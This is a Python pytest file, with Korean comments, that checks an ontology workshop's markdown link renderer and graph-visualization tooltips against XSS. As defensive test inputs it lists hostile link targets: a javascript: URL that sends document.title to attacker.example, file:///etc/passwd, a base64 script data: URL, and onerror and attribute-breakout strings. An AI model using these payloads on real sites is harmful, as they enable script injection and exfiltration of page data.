"""Capstone 1-pager 링크와 T-Box 시각화 툴팁이 신뢰하지 않는 텍스트를 실행 가능한 형태로 내보내지 않는지 고정한다.

판정은 ``html.parser`` 로 읽은 결과다. Capstone 은 렌더링한 HTML 의 ``<a href>`` 값과 요소
구성을 본다. T-Box 시각화는 페이지 인라인 스크립트를 ``html.parser`` 로 꺼내 Node ``vm``
안에서 최소 DOM 스텁으로 실행하고, vis-network 에 넘어간 노드 ``title`` 이 문자열이 아니라
``textContent`` 로 채운 요소인지 확인한다. Node 가 없으면 그 테스트만 skip 한다.

동봉 산출물 검사는 ``workshop/pre-generated`` 를 읽기만 한다.
"""

from __future__ import annotations

import gzip
import json
import re
import shutil
import subprocess
from html.parser import HTMLParser
from pathlib import Path

import pytest
from rdflib import Graph, Literal, URIRef
from rdflib.namespace import OWL, RDF, RDFS

from domain.namespaces import DOMAIN_NS

REPO = Path(__file__).resolve().parent.parent
PRE_DIR = REPO / "workshop" / "pre-generated"
SHIPPED_DOMAIN_NS = "http://example.com/steel-ontology#"
UNREGISTERED_ALIAS = b"https://w3id.org/steel-ontology-sample"

NODE = shutil.which("node")
requires_node = pytest.mark.skipif(NODE is None, reason="node 실행 파일이 없다")

HOSTILE_TEXT = "<img src=x onerror=alert(1)>\" onmouseover=\"alert(1)\" data-x='"


# ── html.parser 헬퍼 ──────────────────────────────────────


class _Elements(HTMLParser):
    """시작 태그와 (복호화된) 속성, 텍스트 노드를 모은다."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.tags: list[tuple[str, dict[str, str | None]]] = []
        self.text: list[str] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_data(self, data):
        self.text.append(data)


def _elements(markup: str) -> _Elements:
    parser = _Elements()
    parser.feed(markup)
    parser.close()
    return parser


def _anchors(markup: str) -> list[dict[str, str | None]]:
    return [attrs for tag, attrs in _elements(markup).tags if tag == "a"]


class _InlineScripts(HTMLParser):
    """``src`` 없는 script 요소의 본문을 원문 그대로 모은다."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=False)
        self.scripts: list[str] = []
        self._inside = False

    def handle_starttag(self, tag, attrs):
        if tag == "script" and not dict(attrs).get("src"):
            self._inside = True
            self.scripts.append("")

    def handle_endtag(self, tag):
        if tag == "script":
            self._inside = False

    def handle_data(self, data):
        if self._inside:
            self.scripts[-1] += data


def _inline_script(page: str) -> str:
    parser = _InlineScripts()
    parser.feed(page)
    parser.close()
    assert len(parser.scripts) == 1, "인라인 스크립트는 하나여야 한다"
    return parser.scripts[0]


# ── scripts/render_capstone.py ────────────────────────────


@pytest.mark.parametrize(
    "target",
    [
        "javascript:location='//attacker.example/?'+document.title",
        " JaVaScRiPt:alert(1)",
        "java\tscript:alert(1)",
        "\x01javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox",
        "file:///etc/passwd",
        "//attacker.example/a",
        "///attacker.example/a",
        "////attacker.example/a",
        "/\\attacker.example/a",
    ],
)
def test_capstone_link_rejects_non_http_targets(target):
    from scripts.render_capstone import render_markdown_to_html

    page = render_markdown_to_html(f"- [도메인 문서]({target})")
    parsed = _elements(page)

    assert _anchors(page) == [], f"허용하지 않는 대상이 링크가 됐다: {target!r}"
    assert "도메인 문서" in "".join(parsed.text), "링크 텍스트는 남아야 한다"


@pytest.mark.parametrize(
    ("target", "expected_href"),
    [
        ("https://example.com/a?b=1&c=2", "https://example.com/a?b=1&c=2"),
        ("http://example.com/", "http://example.com/"),
        ("../docs/guide.md", "../docs/guide.md"),
        ("#section", "#section"),
    ],
)
def test_capstone_link_keeps_http_and_relative_targets(target, expected_href):
    from scripts.render_capstone import render_inline

    assert _anchors(render_inline(f"[문서]({target})")) == [{"href": expected_href}]


def test_capstone_link_cannot_add_attributes_or_elements():
    from scripts.render_capstone import render_inline

    markup = render_inline(
        '[<img src=x onerror=alert(1)>](https://ok.example/" onmouseover="alert(1))'
        " [x](https://ok.example/**b**)"
    )
    parsed = _elements(markup)

    assert [tag for tag, _ in parsed.tags] == ["a", "a"], "링크 외 요소가 생겼다"
    assert [sorted(attrs) for _, attrs in parsed.tags] == [["href"], ["href"]]
    assert parsed.tags[1][1]["href"] == "https://ok.example/**b**", "URL 안의 ** 가 태그가 됐다"
    assert "<img src=x onerror=alert(1)>" in "".join(parsed.text)


def test_capstone_inline_formatting_around_links_is_preserved():
    from scripts.render_capstone import render_inline

    markup = render_inline("**see [doc](https://example.com/)** and `[c](d)` \x000\x00")
    parsed = _elements(markup)

    assert [tag for tag, _ in parsed.tags] == ["strong", "a", "code", "a"]
    assert [attrs.get("href") for tag, attrs in parsed.tags if tag == "a"] == [
        "https://example.com/", "d",
    ]
    assert "\x00" not in markup


# ── tools/visualization.py 툴팁 ───────────────────────────


def _tooltip_graph(comment: str) -> Graph:
    g = Graph()
    commented = URIRef(DOMAIN_NS + "Commented")
    plain = URIRef(DOMAIN_NS + "Plain")
    for cls in (commented, plain):
        g.add((cls, RDF.type, OWL.Class))
        g.add((cls, RDFS.label, Literal("라벨", lang="ko")))
    g.add((commented, RDFS.label, Literal("Commented label", lang="en")))
    g.add((commented, RDFS.comment, Literal(comment, lang="ko")))
    g.add((plain, RDFS.label, Literal("Plain " + HOSTILE_TEXT, lang="en")))
    return g


def _tooltip_page(comment: str) -> str:
    from tools.visualization import _build_html, _extract_tbox_data

    return _build_html(_extract_tbox_data(_tooltip_graph(comment)))


def test_tooltip_title_goes_through_text_element():
    """노드 title 은 데이터 값을 그대로 넘기지 않고 textContent 요소 생성기를 거친다."""
    script = _inline_script(_tooltip_page(HOSTILE_TEXT))
    node_block = script[script.index("const nodes = new vis.DataSet("):script.index("const edges")]
    titles = re.findall(r"^\s*title:\s*(.+?),?$", node_block, re.M)
    helper = script[script.index("function textTooltip("):]
    helper = helper[: helper.index("\n}") + 2]

    assert titles == ["textTooltip(c.comment_ko || c.label_en)"]
    assert "textContent" in helper
    assert "innerHTML" not in helper


_TOOLTIP_HARNESS = r"""
const fs = require('fs');
const vm = require('vm');
const created = [];
function element(tag) {
  const el = {
    tagName: String(tag).toUpperCase(), dataset: {}, style: {}, innerHTMLWrites: 0,
    classList: { add() {}, remove() {}, toggle() {}, contains() { return false; } },
    addEventListener() {}, scrollIntoView() {},
    querySelector() { return null; }, querySelectorAll() { return []; }, closest() { return null; },
  };
  let text = '';
  let markup = '';
  Object.defineProperty(el, 'textContent', { get() { return text; }, set(v) { text = String(v); } });
  Object.defineProperty(el, 'innerHTML', {
    get() { return markup; },
    set(v) { markup = String(v); el.innerHTMLWrites += 1; },
  });
  return el;
}
const byId = {};
const document = {
  getElementById(id) { return byId[id] || (byId[id] = element('div')); },
  createElement(tag) { const el = element(tag); created.push(el); return el; },
  querySelector() { return null; },
  querySelectorAll() { return []; },
};
const datasets = [];
class DataSet { constructor(items) { this.items = items; datasets.push(this); } }
class Network { on() {} selectNodes() {} focus() {} fit() {} setOptions() {} }
const sandbox = { document, vis: { DataSet, Network } };
vm.createContext(sandbox);
vm.runInContext(fs.readFileSync(process.argv[2], 'utf8'), sandbox);
process.stdout.write(JSON.stringify(datasets[0].items.map(node => {
  const t = node.title;
  if (t === null || typeof t !== 'object') return { id: node.id, kind: typeof t };
  return {
    id: node.id, kind: 'element', tag: t.tagName, text: t.textContent,
    created: created.includes(t), innerHTMLWrites: t.innerHTMLWrites,
  };
})));
"""


@requires_node
def test_tooltip_title_is_text_element_at_runtime(tmp_path):
    script_path = tmp_path / "page.js"
    script_path.write_text(_inline_script(_tooltip_page(HOSTILE_TEXT)), encoding="utf-8")
    harness_path = tmp_path / "harness.js"
    harness_path.write_text(_TOOLTIP_HARNESS, encoding="utf-8")

    proc = subprocess.run(
        [NODE, str(harness_path), str(script_path)],
        capture_output=True, text=True, timeout=60, check=False,
    )
    assert proc.returncode == 0, proc.stderr
    nodes = {node["id"]: node for node in json.loads(proc.stdout)}

    expected_text = {"Commented": HOSTILE_TEXT, "Plain": "Plain " + HOSTILE_TEXT}
    assert set(nodes) == set(expected_text)
    for node_id, text in expected_text.items():
        node = nodes[node_id]
        assert node["kind"] == "element", f"{node_id} 툴팁이 문자열로 넘어갔다: {node}"
        assert node == {
            "id": node_id, "kind": "element", "tag": "DIV", "text": text,
            "created": True, "innerHTMLWrites": 0,
        }


# ── 동봉 산출물 ───────────────────────────────────────────


def _data_summary(line: str) -> dict:
    """``const DATA = ...;`` 줄에서 store 반복 순서와 무관한 값만 뽑는다."""
    data = json.loads(line.removeprefix("const DATA = ").removesuffix(";"))
    return {
        "stats": data["stats"],
        "classes": sorted(
            (c["id"], c["uri"], c["label_ko"], c["label_en"], c["comment_ko"]) for c in data["classes"]
        ),
        "object_properties": sorted(p["id"] for p in data["object_properties"]),
    }


@pytest.mark.skipif(DOMAIN_NS != SHIPPED_DOMAIN_NS, reason="동봉 산출물은 기본 철강 예시 도메인용이다")
def test_shipped_tbox_visualization_uses_current_generator():
    """동봉 HTML 은 동봉 T-Box 를 현재 생성기로 렌더링한 결과와 같은 템플릿을 쓴다."""
    from tools.visualization import _build_html, _extract_tbox_data

    graph = Graph(store="Oxigraph")
    graph.parse(PRE_DIR / "t_box.ttl", format="turtle")
    expected = _build_html(_extract_tbox_data(graph)).splitlines()
    shipped_page = (PRE_DIR / "tbox_visualization.html").read_text(encoding="utf-8")
    shipped = shipped_page.splitlines()

    assert len(shipped) == len(expected)
    for got, want in zip(shipped, expected, strict=True):
        if want.startswith("const DATA = "):
            assert _data_summary(got) == _data_summary(want)
        else:
            assert got == want
    handlers = [
        name for tag, attrs in _elements(shipped_page).tags for name in attrs
        if name.startswith("on") and tag != "button"
    ]
    assert handlers == []


def _stream_contains(path: Path, needle: bytes) -> bool:
    tail = b""
    with gzip.open(path, "rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            if needle in tail + chunk:
                return True
            tail = chunk[-len(needle):]
    return False


def test_shipped_graphs_carry_no_unregistered_identifier_alias():
    """동봉 T-Box 와 추론 그래프는 등록되지 않은 영구 식별자를 온톨로지 별칭으로 쓰지 않는다."""
    assert UNREGISTERED_ALIAS not in (PRE_DIR / "t_box.ttl").read_bytes()
    assert not _stream_contains(PRE_DIR / "all_inferred.ttl.gz", UNREGISTERED_ALIAS)
